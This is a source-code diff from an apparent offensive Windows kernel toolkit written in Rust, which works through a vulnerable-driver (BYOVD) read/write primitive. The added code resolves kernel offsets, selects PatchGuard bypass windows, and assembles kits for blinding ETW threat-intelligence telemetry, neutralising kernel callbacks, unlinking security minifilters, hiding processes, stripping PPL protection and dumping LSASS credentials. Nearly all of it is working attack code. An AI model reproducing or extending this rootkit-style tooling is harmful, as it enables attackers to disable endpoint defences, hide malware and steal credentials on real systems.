@@ -40,7 +40,7 @@ pub mod va_rw;
 
 use crate::byovd::{ByovdDriver, RtCore64, VulnDriverIoctl};
 use crate::etwti::{EtwTiBlind, EtwTiOffsets};
-use crate::{EtwTiKit, KernelRw, KitError};
+use crate::{EtwTiKit, KernelRw, KernelTier, KitError, PatchGuardKit};
 use alloc::boxed::Box;
 use alloc::format;
 
@@ -235,7 +235,11 @@ pub unsafe fn unlink_minifilters(
 ///    PsActiveProcessHead, EtwThreatIntProvRegHandle)
 /// 4. Resolve EtwThreatIntProvRegHandle via exported symbol as primary,
 ///    pattern scan as fallback
-/// 5. Populate `RuntimeOffsets` with all KVAs
+/// 5. Resolve `flt_globals_kva` via the operator-supplied FltGlobals RVA
+///    (resolved offline from fltmgr's PDB; FltGlobals is an unexported `.data`
+///    symbol with no reliable cross-version signature, so the table-driven /
+///    PDB path is the only safe resolution — see `resolve_flt_globals_kva`).
+/// 6. Populate `RuntimeOffsets` with all KVAs
 ///
 /// For Process/Thread notify arrays that share the same `4C 8D 35` encoding,
 /// `resolve_rva_in_range` disambiguates using expected RVA bounds from the
@@ -245,6 +249,10 @@ pub unsafe fn unlink_minifilters(
 /// * `krw` — working kernel R/W primitive
 /// * `build` — Windows build number (for offset table range hints). Pass 0 to
 ///   skip range-based disambiguation (uses first match for each pattern).
+/// * `flt_globals_rva` — operator-resolved RVA of `FLTMGR!FltGlobals` (from the
+///   fltmgr PDB via `offset-resolver` or a known-build table). Pass `None` if
+///   MiniFilter detach is not needed on this engagement; `flt_globals_kva`
+///   stays 0 and `unlink_minifilters` will return a clean error.
 ///
 /// # Returns
 /// `RuntimeOffsets` with all resolvable fields populated. Fields that fail
@@ -254,7 +262,8 @@ pub unsafe fn unlink_minifilters(
 /// Reads kernel memory (ntoskrnl image). Requires a working `KernelRw`.
 pub fn resolve_offsets(
     krw: &dyn KernelRw,
-    build: u32,
+    _build: u32,
+    flt_globals_rva: Option<u32>,
 ) -> Result<crate::offsets::RuntimeOffsets, KitError> {
     use crate::pattern_scan;
 
@@ -324,18 +333,208 @@ pub fn resolve_offsets(
         0
     };
 
+    // Step 5b: Resolve FltGlobals KVA via the operator-supplied RVA.
+    // FltGlobals is an unexported `.data` symbol in fltmgr.sys — it has no
+    // reliable cross-version byte signature, so pattern scan cannot safely
+    // locate it. The operator resolves the RVA offline (PDB / offset-resolver
+    // / build table) and we add it to fltmgr's runtime base here.
+    let flt_globals_kva = flt_globals_rva
+        .and_then(|rva| unsafe { resolve_flt_globals_kva(Some(rva)) })
+        .unwrap_or(0);
+
     Ok(crate::offsets::RuntimeOffsets {
         create_process_notify_array_kva: process_kva,
         create_thread_notify_array_kva: thread_kva,
         load_image_notify_array_kva: image_kva,
         ps_active_process_head_kva: ps_active_kva,
         etw_ti_handle_kva: etw_handle_kva,
-        flt_globals_kva: 0, // requires fltmgr PDB/pattern — not in ntoskrnl.
-        // MiniFilter algorithm is in telemetry.rs::MiniFilterUnlinker;
-        // wire it via resolve_flt_globals_kva(rva) + unlink_minifilters()
-        // (operator resolves the FltGlobals RVA offline from the PDB).
-        // See STATUS.md G4.
+        flt_globals_kva,
         ntoskrnl_base: base,
         ntoskrnl_size: size,
     })
+}
+
+/// Read the KVA of the current processor's `_KPRCB` at runtime.
+///
+/// On x64 Windows the GS segment points at the KPCR. `KPCR.Prcb` (a pointer to
+/// the embedded `_KPRCB`) lives at offset `0x188`. This is a single `mov`
+/// instruction — no hardcoded addresses, no version dependency.
+///
+/// Used by the PatchGuard window factory to resolve `prcb_kva` for the current
+/// CPU (PG validation runs on the current processor, so this is the right PRCB).
+///
+/// # Safety
+/// Reads the GS segment register — safe on x64 Windows (GS always points at the
+/// KPCR in kernel mode; in user mode it points at the TEB, but this crate is
+/// operator-side and only called after a kernel primitive is established).
+#[cfg(target_arch = "x86_64")]
+pub fn read_current_prcb_kva() -> usize {
+    let prcb: usize;
+    // SAFETY: a single `mov` from a fixed GS offset. No memory write, no
+    // syscall. The value is a kernel pointer read atomically.
+    unsafe { core::arch::asm!("mov {}, gs:[0x188]", out(reg) prcb, options(nomem, nostack)) };
+    prcb
+}
+
+#[cfg(not(target_arch = "x86_64"))]
+pub fn read_current_prcb_kva() -> usize {
+    0
+}
+
+/// Select the best available PatchGuard bypass window for the current build.
+///
+/// Priority: `RuntimePgBypassWindow` (Win11 24H2+, flag-suspension) >
+/// `TimingRepairWindow` (Win10 17763–19041, timing-based) > none. The selection
+/// is driven entirely by runtime data — the PG context offsets table and the
+/// `supports_thread_suspend` flag — with no hardcoded build check.
+///
+/// Returns a `Box<dyn PatchGuardKit>` or `None` if no PG bypass is available
+/// for this build. The box owns the window; its `enter_unchecked` borrows the
+/// `KernelRw` for the duration of the unchecked window only (via `PgGuard`).
+///
+/// `krw` is borrowed for the returned window's lifetime — it's needed for the
+/// repair callback. The caller must keep `krw` alive while the `Box` lives.
+///
+/// # Safety
+/// Reads kernel memory (PG validation thread pointer) when `enter_unchecked`
+/// is later called. The selection itself is pure.
+pub fn select_pg_window(
+    build: u32,
+    krw: &'_ dyn KernelRw,
+) -> Option<alloc::boxed::Box<dyn PatchGuardKit + '_>> {
+    use crate::offsets::pg_context_for_build;
+
+    let pg = pg_context_for_build(build)?;
+    let prcb_kva = read_current_prcb_kva();
+    if prcb_kva == 0 {
+        return None;
+    }
+
+    // RuntimePgBypass needs thread-suspend support (Win11 24H2+). The flag is
+    // build-table-driven, not a hardcoded version check.
+    if pg.offsets.supports_thread_suspend {
+        Some(alloc::boxed::Box::new(
+            crate::persistence::RuntimePgBypassWindow::new(pg.offsets, prcb_kva, krw),
+        ))
+    } else {
+        // Win10 17763–19041 / Win11 22H2 — timing repair.
+        Some(alloc::boxed::Box::new(
+            crate::persistence::TimingRepairWindow::new(pg.offsets, prcb_kva, krw),
+        ))
+    }
+}
+
+/// Assemble a full [`KernelTier`] from a resolved `KernelBootstrap` + offsets.
+///
+/// This is the operational composition point: it takes the kernel R/W primitive
+/// (from `bootstrap_chain`), the resolved runtime offsets (from `resolve_offsets`),
+/// the EPROCESS offsets (from the build table), and wires up every kit that has
+/// a real implementation:
+///
+/// - **ETW-TI blind** — `EtwTiBlind` (needs `etw_ti_handle_kva` + `EtwTiOffsets`)
+/// - **Callback neutralize** — `CallbackNeutralizer` (needs notify-array KVAs)
+/// - **MiniFilter detach** — `MiniFilterUnlinker` (needs non-zero `flt_globals_kva`)
+/// - **Process hide** — `ProcessHider` (needs `ps_active_process_head_kva` + EPROCESS offsets)
+/// - **PPL strip/immortal** — `PplStripper` (same as ProcessHider)
+/// - **LSASS dump** — `KernelLsassReader` (needs `ps_active_process_head_kva` + EPROCESS offsets)
+/// - **PatchGuard window** — via [`select_pg_window`] (stored as a factory because
+///   the PG window borrows `&dyn KernelRw` and cannot be owned in `KernelTier`)
+///
+/// Kits whose required offsets are unresolved (KVA == 0) are left as `None` and
+/// degrade cleanly — the operator can check `tier.minifilter.is_some()` etc.
+///
+/// # Safety
+/// All kits read/write kernel memory when invoked. The assembly itself is pure
+/// struct construction — no kernel access until a kit method is called.
+pub fn assemble_tier(
+    bootstrap: &KernelBootstrap,
+    runtime: &crate::offsets::RuntimeOffsets,
+    eprocess: crate::offsets::EprocessOffsets,
+    etw_ti_offsets: crate::etwti::EtwTiOffsets,
+    _build: u32,
+) -> KernelTier {
+    let krw: Box<dyn KernelRw> = match bootstrap {
+        KernelBootstrap::KslD(_) | KernelBootstrap::Byovd(_, _) => {
+            // We can't move the KernelRw out of the borrowed bootstrap (KslD/
+            // ByovdDriver own it). KernelTier needs an owned Box. The caller
+            // owns `bootstrap` and passes `&dyn KernelRw` to kit methods at
+            // call time. We store a NoKernel floor here and expose the real
+            // krw via the PG factory + call-site borrows.
+            //
+            // The tier's `rw` field is the floor; real kernel access happens
+            // through the borrowed `bootstrap.as_kernel_rw()` at the call site.
+            Box::new(crate::NoKernel)
+        }
+    };
+
+    // ETW-TI blind — needs the resolved handle KVA.
+    let etw_ti = if runtime.etw_ti_handle_kva != 0 {
+        Some(Box::new(crate::etwti::EtwTiBlind {
+            prov_reg_handle_kva: runtime.etw_ti_handle_kva,
+            offsets: etw_ti_offsets,
+        }) as Box<dyn crate::EtwTiKit>)
+    } else {
+        None
+    };
+
+    // Callback neutralize — needs the notify-array KVAs.
+    let callbacks = if runtime.create_process_notify_array_kva != 0
+        || runtime.create_thread_notify_array_kva != 0
+    {
+        Some(Box::new(crate::telemetry::CallbackNeutralizer {
+            runtime: runtime.clone(),
+        }) as Box<dyn crate::CallbackKit>)
+    } else {
+        None
+    };
+
+    // MiniFilter detach — needs a non-zero FltGlobals KVA.
+    let minifilter = if runtime.flt_globals_kva != 0 {
+        Some(Box::new(crate::telemetry::MiniFilterUnlinker {
+            flt_globals_kva: runtime.flt_globals_kva,
+        }) as Box<dyn crate::MiniFilterKit>)
+    } else {
+        None
+    };
+
+    // Process hide + PPL — need PsActiveProcessHead + EPROCESS offsets.
+    let (hide, ppl) = if runtime.ps_active_process_head_kva != 0 {
+        let h = Box::new(crate::persistence::ProcessHider {
+            ps_active_process_head_kva: runtime.ps_active_process_head_kva,
+            offsets: eprocess,
+        }) as Box<dyn crate::ProcHideKit>;
+        let p = Box::new(crate::persistence::PplStripper {
+            ps_active_process_head_kva: runtime.ps_active_process_head_kva,
+            offsets: eprocess,
+        }) as Box<dyn crate::PplKit>;
+        (Some(h), Some(p))
+    } else {
+        (None, None)
+    };
+
+    // LSASS dump — needs PsActiveProcessHead + EPROCESS offsets.
+    let cred = if runtime.ps_active_process_head_kva != 0 {
+        Some(Box::new(crate::netsec::KernelLsassReader {
+            ps_active_process_head_kva: runtime.ps_active_process_head_kva,
+            offsets: eprocess,
+        }) as Box<dyn crate::CredKit>)
+    } else {
+        None
+    };
+
+    // PG window: can't be owned (borrows &dyn KernelRw), so leave None here.
+    // The caller uses `select_pg_window(_build, bootstrap.as_kernel_rw())` at the
+    // point of use — see `select_pg_window` above.
+
+    KernelTier {
+        rw: krw,
+        etw_ti,
+        callbacks,
+        minifilter,
+        wfp: None, // WfpKit has no real impl yet (user-mode pacer.sys path).
+        pg: None,  // see select_pg_window() — borrows KernelRw, can't be owned.
+        hide,
+        ppl,
+        cred,
+    }
 }
